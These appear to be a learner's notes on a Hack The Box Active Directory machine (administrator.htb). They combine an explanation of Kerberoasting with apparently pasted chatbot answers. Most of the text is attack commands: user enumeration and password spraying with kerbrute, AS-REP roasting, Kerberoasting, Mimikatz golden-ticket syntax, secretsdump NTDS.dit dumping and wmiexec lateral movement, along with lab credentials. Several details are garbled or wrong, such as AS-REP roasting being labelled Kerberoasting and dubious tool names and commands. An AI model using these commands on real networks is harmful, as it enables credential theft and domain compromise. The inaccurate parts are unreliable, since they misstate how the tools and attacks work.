Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (“SPN”).

# How do Kerberoasting attacks work?
Kerberoasting attacks exploit a combination of weak encryption techniques and simple or low-complexity passwords. These attacks typically follow the below process:

1. A threat actor compromises the account of a Domain User.
2. The threat actor uses the Domain User context to  request a Kerberos service ticket from the ticket granting service (TGS) using tools like GhostPack’s Rubeus or SecureAuth Corporation’s GetUserSPNs.py.
username: Olivia
password: ichliebedich
3. The threat actor receives a ticket from the Kerberos key distribution center (KDC). The ticket is encrypted with a hashed version of the account’s password.
4. The threat actor captures the TGS ticket and takes it offline.
5. The threat actor attempts to crack the SPN credential hash to obtain the service account’s plaintext password using brute force techniques or tools like Hashcat or JohnTheRipper.
6. With the service account password in hand, the threat actor attempts to authenticate as  the service account and is granted access to any service, network or system associated with the compromised account.
7. The attacker is then able to steal data, escalate privileges or set backdoors on the network to ensure future access.

# A few things to keep in mind:
->Kerberoasting attacks do not require a Domain Admin account or an account that has elevated privileges. In fact, any Domain User account can be used in this attack type since any account can request service tickets from the TGS.
->Kerberoasting requires the adversary to have existing access to a user account in order to request tickets from the KDC. This access can be achieved from a variety of methods, such as social engineering, malware or even purchasing user credentials on the dark web.
->The SPN can be linked to either a host-based or domain user account. Host-based SPNs are not vulnerable to Kerberoasting attacks because the password is a long, complex key that is refreshed every 30 days or less. These complex, random passwords are difficult to crack even with advanced cracking tools and brute force techniques. User account SPN passwords, on the other hand, are selected by humans and therefore often subject to the same vulnerabilities of any other manually created passwords. This is to say that the SPN password may be considered weak, common, outdated, recycled or reused. Advanced tools can often crack these passwords in a matter of hours.
->Kerberoasting attacks also exploit an architecture flaw, in that any authenticated domain user can initiate a TGS request for any service on the network. The domain controller that is the recipient of the request typically does not check to see if the user is authorized to access this service. The service itself enforces access rights, which creates a loophole by which an offline attack can occur.

Let’s start enumerate the kerberos users and see if we can find something: this time lets use Kerbrute (https://github.com/ropnop/kerbrute)

You can find the list i used here: (https://github.com/insidetrust/statistically-likely-usernames)


    ./kerbrute_linux_amd64 userenum --dc <commonName> -d <domainName> -v /path/to/wordlist   | kerbrute.outdated

To filter for valid usernames
    
    cat kerbrute.out | grep '+' | awk '{print$7}' > usernames.txt


Now we have a list of valid Users but no passwords.

Let's try an ASRep Roasting attack, attempting to exploit the lack of pre-authentication for some accounts, we can try to intercept some hashes.

    cat usernames.txt | head

    GetNPUsers.py jab.htb -userfile usernames.txt -format hashcat -outputfile hashes_roast.txt

To get any pre-authenticated users with their hash

    cat hashes_roast.txt
    
Crach the hshes using hashcat

    hashcat hashes_roast.txt /path/to/wordlist --show
    
We have now a clear password for jmontgomery@jab.htb, and we can check if it works and has been reused: let’s spay the password for all the users

    ./kerbrute_linux_amd64 passwordspray --dc <commonName> -d <domainName> username.txt <password>



Enumerate Kerberos Principals
To find Kerberos service principals, you can use kerberos-enum or krb5-enum. These tools will query the Kerberos service and attempt to list all Kerberos principals (e.g., service accounts, machine accounts).

Using kerberos-enum:
    
    python3 kerberos-enum.py -t <target_ip> -d <domain_name>
<target_ip>: The target IP address of the machine with Kerberos enabled.
<domain_name>: The Active Directory domain name (e.g., example.com).
If the target is using a Windows domain, you can also specify the domain controller or fully qualified domain name (FQDN).

This will attempt to enumerate all the Kerberos principals on the domain. The output should list service accounts, domain controllers, and other resources registered with Kerberos.

Using krb5-enum:
    
    python3 krb5-enum.py -t <target_ip> -d <domain_name>
This command will try to enumerate Kerberos service tickets.

Output: Look for a list of service principals like host/<hostname>, HTTP/<service-name>, ldap/<domain>, etc. This tells you which services are available for Kerberos authentication.

Step 4: Check for Service Tickets or TGT (Ticket Granting Ticket)
Once you have the list of Kerberos principals, the next step is to try and obtain a valid ticket. You can attempt to request a Ticket Granting Ticket (TGT) for the Olivia user (if they are part of the domain).

Step 4a: Attempt to Get a TGT for Olivia
To request a TGT for Olivia, use krb5 utilities like kinit (a Kerberos authentication tool) or impacket's GetTGT.py.

With kinit:

    kinit Olivia@<domain_name>
This will prompt you for the password (ichliebedich). If successful, you will get a TGT for Olivia.
    
If you already have the credentials and the domain is configured properly, you can attempt to log in using kinit and get a Kerberos ticket for the target user.

Example:

    kinit Olivia@administrator.htb
If successful, you should get the TGT for Olivia.
If unsuccessful, verify the credentials or consider testing a different user account.
Step 4b: Use GetTGT.py from Impacket
Another useful tool is Impacket's GetTGT to request a TGT for a given user.

    python3 GetTGT.py Olivia@<domain_name> -password ichliebedich
This will request a TGT from the Kerberos server for Olivia. If the credentials are correct, it will output a valid TGT ticket.

Step 5: Use Kerberos Ticket to Authenticate to Services
Once you have obtained a TGT for Olivia, you can use this ticket to authenticate to other services (like SMB, HTTP, etc.).










Using kerbrute (Brute Force/Enumeration)
If you want to enumerate users or check for weak credentials, you can use kerbrute for Kerberos brute forcing.

To enumerate users against a domain, use:

    kerbrute userenum -d <domain_name> -t <target_ip> /path/to/userlist.txt
This will attempt to enumerate all users listed in the userlist.txt file. You need to create this list or get a common list of users like rockyou.txt.

To brute force a user password, use:

    kerbrute brute -d <domain_name> -t <target_ip> -u <username> -P /path/to/passwordlist.txt
This will attempt to brute-force the password for the specified user (<username>) using a password list (passwordlist.txt).

2.4. Using kerberos-enum.py
This script allows for more advanced Kerberos enumeration, like gathering information about users, service accounts, and domain details.

    python3 kerberos-enum.py -t <target_ip> -d <domain_name>
This command will query the target Kerberos service and enumerate useful information about users, services, and more.

Step 3: Use the Tools on Your Target
Now that you have the tools installed and set up, you can begin using them against your specified target (10.10.11.42) with the given domain (EXAMPLE.COM) and credentials (Olivia / ichliebedich).

Start by running GetTGT.py to obtain a TGT ticket:

    python3 GetTGT.py Olivia@EXAMPLE.COM -password ichliebedich
Next, authenticate using the kinit command to validate the TGT:

    kinit Olivia@EXAMPLE.COM
Afterward, you can proceed with kerbrute for brute-forcing or user enumeration, depending on your goals:

    kerbrute userenum -d EXAMPLE.COM -t 10.10.11.42 /path/to/userlist.txt
Or, if you have a user to test:

    kerbrute brute -d EXAMPLE.COM -t 10.10.11.42 -u Olivia -P /path/to/passwordlist.txt
Finally, use kerberos-enum.py to gather more information:

    python3 kerberos-enum.py -t 10.10.11.42 -d EXAMPLE.COM











    kerbrute userenum --dc 10.10.11.42 --domain administrator.htb  john.txt

The "KRB_AP_ERR_SKEW (Clock skew too great)" error typically occurs when there is a significant time difference between the client machine and the domain controller (DC). Kerberos authentication is sensitive to time discrepancies because it relies on synchronized timestamps for ticket validation.

Sync the Time with the Domain Controller:

You can manually sync your time with the domain controller using the ntpdate command. Replace 10.10.11.42 with the IP of your domain controller (if it’s different).

    sudo ntpdate -u 10.10.11.42

Since you're focusing on Kerberos attacks, let's dive into tools and techniques that are used to exploit vulnerabilities in Kerberos authentication. Here are the key tools and methods for conducting Kerberos-related attacks:

1. Kerberos Basics
Before jumping into tools, let’s clarify the main attack vectors:

Ticket Granting Ticket (TGT): A Kerberos ticket that allows access to various services within the network.
Service Tickets: Tickets used to authenticate to specific services within the network.
Ticket Forgery/Manipulation: Forging or manipulating Kerberos tickets to impersonate users or services.
2. Important Kerberos Attacks
Pass-the-Ticket (PTT): Using stolen Kerberos tickets to authenticate as a user or service.
Pass-the-Hash (PTH): Using NTLM hashes to authenticate and steal Kerberos tickets.
Golden Ticket: Forging a TGT using knowledge of the Kerberos Key Distribution Center (KDC)'s secret key (KRBTGT).
Silver Ticket: Forging service tickets (TGS) to impersonate a user for a specific service.
Kerberoasting: Extracting and cracking service account passwords by requesting service tickets for services in the domain.
3. Key Tools for Kerberos Attacks
Here are the primary tools used in attacking Kerberos authentication:

1. Mimikatz
Mimikatz is one of the most well-known tools for performing Kerberos-related attacks.

Pass-the-Ticket (PTT): Mimikatz can be used to steal and inject Kerberos tickets, allowing attackers to impersonate users or services.
Golden Ticket: Mimikatz can forge TGTs (Golden Tickets) if the attacker has access to the KRBTGT hash (typically retrieved from domain controllers).
Silver Ticket: Mimikatz can forge service tickets for a specific service (Silver Tickets) if you have the service's NTLM hash.
Kerberoasting: Mimikatz can also be used to request service tickets for service accounts and dump them for offline cracking.
Commands:

To dump Kerberos tickets:

    sekurlsa::tickets
To forge a Golden Ticket:

    kerberos::golden /user:<username> /domain:<domain> /sid:<domainSID> /rc4:<krbtgt_hash>
Download: Mimikatz

2. Rubeus
Rubeus is a powerful tool specifically focused on Kerberos. It is useful for automating many Kerberos-related attacks.

Kerberoasting: Rubeus can request service tickets and extract them for offline cracking.
Ticket Extraction: You can extract TGTs and service tickets, then inject or manipulate them.
Golden Ticket Creation: Rubeus can create Golden Tickets, enabling attackers to impersonate users with domain admin privileges if they have the KRBTGT hash.
Examples:

Kerberoasting: Request service tickets for service accounts:
Rubeus.exe tgtreq /user:<username>
Golden Ticket: Generate a Golden Ticket:
Rubeus.exe tgt /user:<username> /rc4:<krbtgt_hash> /domain:<domain> /sid:<domainSID>
Download: Rubeus

3. Impacket
Impacket is a collection of Python scripts that can be used for various network protocol attacks, including Kerberos.

GetTGT: Use GetTGT to obtain TGTs by brute-forcing or other means.
Pass-the-Ticket: The psexec.py and wmiexec.py scripts can be used to inject Kerberos tickets and perform lateral movement once the ticket is stolen or forged.
Kerberos Tickets Enumeration: You can use the secretsdump.py tool to dump hashes from Windows machines that may include Kerberos-related information.
Examples:

GetTGT: Obtain a TGT by brute-forcing the password of a user.
    
    GetTGT.py <domain>/<user>:<password>
Pass-the-Ticket: Inject the Kerberos ticket into the current session for use.
pth-winexe -k <ticket> <target_ip> cmd

4. Kerberos Exploitation Framework (KEF)
The Kerberos Exploitation Framework (KEF) is a dedicated framework for attacking and exploiting Kerberos.

It automates attacks like Kerberoasting, Pass-the-Ticket, and Golden Ticket attacks.
It provides a user-friendly interface to generate and inject Kerberos tickets.

5. ASREPRoast (Kerberoasting)
ASREPRoast is a technique where you request service tickets for service accounts and then try to crack the tickets offline.

Impacket's GetNPUsers.py script is often used for Kerberoasting.
Tools: Tools like Rubeus or Mimikatz can request service tickets for service accounts and store them for offline cracking.
Example:

    GetNPUsers.py -dc-ip <dc_ip> -domain <domain> -usersfile <user_list>
6. CrackStation / John the Ripper
Once you have service tickets (in .kirbi format from tools like Mimikatz or Rubeus), you can use cracking tools like John the Ripper or CrackStation to brute-force the service account passwords.

John the Ripper Example:

Convert .kirbi files to a format John the Ripper can use and start cracking.

4. Common Kerberos Attack Techniques
Kerberoasting: Request service tickets for service accounts and crack them offline.
Golden Ticket: Forge a TGT with knowledge of the KRBTGT hash, enabling domain admin privileges.
Silver Ticket: Forge a service ticket for a specific service, such as a file share or web application.
Pass-the-Ticket: Inject a stolen or forged Kerberos ticket into a session to authenticate as a different user.
5. Post-Attack Actions
Once you have exploited Kerberos and obtained elevated privileges:

Lateral Movement: Use stolen tickets or cracked passwords to move laterally within the network.
Persistence: Create new accounts with elevated privileges, or set up additional Golden Tickets for long-term access.
Data Exfiltration: Steal sensitive data once you have access to critical resources.


Fully Qualified Principal Name: Use the correct format for the Kerberos principal, where administrator.htb is the domain and Olivia is the username.

Correct the command as follows:

    py getTGT.py administrator/Olivia:ichliebedich -dc-ip 10.10.11.42

















Running the Script:
You can run this script from the command line as follows:

    python GetADUsers.py <domain>/username:password [-user username] [-all] [-k] [-dc-ip ip] [-dc-host host]
Example Usage:
Basic Usage: Query the domain for user details.

    python GetADUsers.py example.com/user:password
Filter by Specific User: Query for a specific user by their username.

    python GetADUsers.py example.com/user:password -user jdoe
Include All Users: Return all users, even those with no email or disabled accounts.

    python GetADUsers.py example.com/user:password -all
Use Kerberos Authentication:

    python GetADUsers.py example.com/user:password -k
Required Libraries:
This script requires the following libraries:

impacket: For SMB, LDAP, and Kerberos protocols.
argparse: For command-line argument parsing.
logging: For logging script activity.
datetime: For processing timestamps.
Notes:
Make sure you have the required dependencies installed (impacket can be installed using pip install impacket).
Ensure the account you're querying with has sufficient privileges to query the domain.
Depending on the network configuration, you might need to specify the domain controller IP (-dc-ip) or hostname (-dc-host).







It looks like you're using GetADUsers.py from the Impacket toolkit to enumerate Active Directory (AD) users on the domain administrator.htb. The command output shows the usernames and details like PasswordLastSet and LastLogon for each user, which is useful for identifying potentially stale accounts or recent logins.

Here are some recommended next steps to continue exploring attack vectors:

1. Kerberoasting
Since you have a list of users, check if any of these accounts are service accounts. Service accounts often have SPNs (Service Principal Names) associated with them, which can be used for Kerberoasting attacks.
Use the GetUserSPNs.py script from Impacket to identify accounts with SPNs and obtain their Kerberos TGS tickets, which you can then try to crack offline.
python GetUserSPNs.py administrator.htb/olivia:ichliebedich -request
2. AS-REP Roasting
Some accounts may have the Do not require Kerberos preauthentication attribute set, which makes them vulnerable to AS-REP roasting.
Use the GetNPUsers.py script in Impacket to enumerate these accounts and retrieve AS-REP hashes for offline cracking.
python GetNPUsers.py administrator.htb/ -usersfile users.txt -format hashcat -outputfile hashes.asrep
3. Extract and Crack Hashes
You can also try to extract NTLM hashes for users using tools like secretsdump.py (if you have the necessary privileges) and then attempt offline cracking with tools like Hashcat or John the Ripper.
python secretsdump.py administrator.htb/olivia:ichliebedich@administrator.htb
4. Enumeration for Ticket Extraction
If you have access to a valid user session, try to enumerate Kerberos tickets for potential Pass-the-Ticket (PtT) attacks. Tools like Mimikatz (on Windows) or Rubeus (C#) can help with extracting Kerberos tickets for offline analysis.
5. Monitoring Password Policy
Review the password change times (PasswordLastSet) and check if certain accounts have older passwords. Accounts with a long PasswordLastSet date could potentially have weak passwords, making them more vulnerable to cracking attacks.













It looks like you've discovered a service principal name (SPN) for the user ethan, which can be valuable for further attack steps, especially if you can retrieve a Kerberos Ticket Granting Service (TGS) ticket for it.

1. Verify Username and Password
If you have a password for the ethan account, test it by logging in to the domain. This can help determine if you have valid credentials.
    
    py python GetADUsers.py administrator.htb/ethan:<password> -all

You could also try using smbclient.py or wmiexec.py from Impacket to verify if the password works by listing accessible shares or attempting remote execution.
2. Enumerate Shares and Accessible Services
If the password is valid, enumerate accessible SMB shares. This can reveal sensitive files or folders, especially if the user ethan has broader permissions.

    python smbclient.py administrator.htb/ethan:<password>@administrator.htb -no-pass
3. Kerberoasting
With a valid user and SPN, try Kerberoasting to request the service ticket for the SPN just/whateverUn1Que. This will yield an encrypted ticket, which can be cracked offline.
    
    python GetUserSPNs.py administrator.htb/ethan:<password> -request
The resulting ticket hash can be fed into Hashcat or John the Ripper for offline cracking.
4. Check Group Memberships and Privileges
If you have credentials for ethan, retrieve additional information about ethan’s group memberships and privileges. This can help determine if ethan has access to sensitive areas within the domain or if ethan is part of groups with elevated privileges.
    
    python GetADUsers.py administrator.htb/ethan:<password> -all
5. Exploit Privileges for Lateral Movement
If ethan has local admin rights on any machine, use the credentials for lateral movement with wmiexec.py or psexec.py.

    python wmiexec.py administrator.htb/ethan:<password>@target_machine
6. Dump NTDS.dit if High Privileges
If ethan is a member of the Domain Admins group or has access to a domain controller, use secretsdump.py to dump NTDS.dit, potentially capturing credentials for all domain users.
    
    python secretsdump.py administrator.htb/ethan:<password>@domain_controller
These steps can reveal additional credentials, privilege levels, and access to critical systems, enabling further exploration or privilege escalation within the domain. Let me know if you need help with any of these specific steps!





The entry just/whateverUn1Que appears to be an SPN (Service Principal Name) rather than a password. Service Principal Names are identifiers for services within a domain, typically in the format service/hostname. In this case, just/whateverUn1Que is likely a unique identifier for a service associated with the ethan account.

If you found this alongside ethan’s account, here’s what you might do next:

Confirm if it’s an SPN or Password: SPNs are generally formatted as service/hostname and would not directly function as a password. You can verify if it's an SPN by attempting a Kerberoasting attack:

    python GetUserSPNs.py administrator.htb/ethan:<password> -request
If successful, this will retrieve a Kerberos TGS ticket, which can then be cracked offline to try to retrieve the actual password.

Try Logging in with ethan: If you still suspect just/whateverUn1Que could be a password, attempt to log in with it using Ethan’s account:

    python GetADUsers.py administrator.htb/ethan:just/whateverUn1Que -all
Alternatively, you can test it with smbclient.py to see if you have any access.

Let me know if either approach clarifies whether just/whateverUn1Que is functional as a password or if it provides further access to the domain!
